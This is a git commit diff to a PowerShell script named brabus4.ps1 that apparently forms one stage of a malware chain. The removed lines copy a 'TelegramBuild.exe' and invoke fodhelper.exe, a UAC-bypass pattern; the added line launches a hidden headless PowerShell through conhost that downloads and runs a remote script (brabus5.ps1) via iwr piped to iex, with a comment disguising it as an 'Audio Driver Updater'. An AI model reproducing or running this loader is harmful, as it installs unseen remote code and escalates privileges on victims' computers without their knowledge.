a09224ea206f00af4603edddb0645499ab2184fc
waed69 <waedpsn2@gmail.com>
2025-04-26 18:17:05 +0200

    Update brabus4.ps1

--- brabus4.ps1
+++ brabus4.ps1
@@ -1,2 +1,2 @@
-Copy-Item "C:\Users\$env:USERNAME\Downloads\TelegramBuild.exe" "C:\Users\$env:USERNAME\not-existent-yet"
-fodhelper.exe
+Copy-Item "C:\Users\$env:USERNAME\Downloads\TelegramBuild\TelegramBuild.exe" "C:\Users\$env:USERNAME\not-existent-yet"
+Start-Process conhost.exe -ArgumentList "--headless powershell -Command `"iwr https://raw.githubusercontent.com/waed69/Brabus/main/brabus5.ps1 | iex; '# Audio Driver Updater 4.7X - (Build 2025.01.12)'`""
